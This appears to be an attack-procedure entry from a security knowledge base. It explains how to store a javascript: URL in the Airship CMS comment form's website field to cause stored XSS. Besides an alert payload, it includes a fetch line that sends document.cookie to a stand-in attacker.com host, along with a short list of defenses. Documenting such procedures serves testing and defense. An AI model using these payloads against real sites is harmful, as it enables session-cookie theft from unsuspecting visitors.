---
id: proc-uuid-001
name: Submit-Malicious-Comment-with-JavaScript-URL
tags:
  - xss
  - stored-xss
  - injection
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:16:14.557Z'
skill_level: beginner
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Submit-Malicious-Comment-with-JavaScript-URL

## Summary

This procedure involves submitting a comment in the Airship CMS with a malicious javascript: URL in the author's website field, exploiting the absence of protocol validation to store the payload for later execution.

## Description

In the Airship application, the comments section allows users to input an author's website URL without filtering non-HTTP(S) protocols. By entering a javascript: scheme (e.g., javascript:alert(document.cookie)), the payload is stored in the database and later rendered directly into an href attribute of an <a> element on the blog post page. This sets up a stored XSS attack that requires user interaction to trigger but can lead to arbitrary JavaScript execution in the context of the page, potentially stealing cookies or performing other actions if the site's Content Security Policy (CSP) does not block it.

## Requirements

1. Access to a public blog post page with enabled comments in Airship CMS
2. A web browser to interact with the form
3. No authentication needed for anonymous comment submission

## Defense

Defensive measures and detection strategies:

- Implement server-side validation to whitelist only http/https protocols for URL fields
- Enforce a strict CSP with 'unsafe-inline' disallowed for script-src
- Sanitize all user inputs before storage and rendering, using HTML entity encoding for attributes
- Monitor for unusual comment submissions via logging

## Objectives

1. Store a malicious javascript: URL in the comments database
2. Prepare for XSS execution without immediate detection
3. Demonstrate lack of input validation in the website field

## Instructions

### Step 1: Locate Comment Form

**Context**: Identify a vulnerable page to target for comment submission.

Navigate to any blog post in the Airship application that has an active comments section.

### Step 2: Craft and Submit Payload

**Context**: Enter the malicious URL in the website field to bypass filtering.

In the comment form:
- Author name: Any value (e.g., "Test User")
- Email: Valid or dummy email
- Website: `javascript:alert(1)` (or more advanced payload like `javascript:fetch('https://attacker.com/steal?cookie='+document.cookie)`)
- Comment body: Any text to make it look legitimate

Click submit to post the comment.

> The form submission sends the data to the backend without protocol checks, storing it raw.

**Expected Output**: Confirmation of comment posting; the comment appears in the list.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[stored-xss]]
- [[web]]
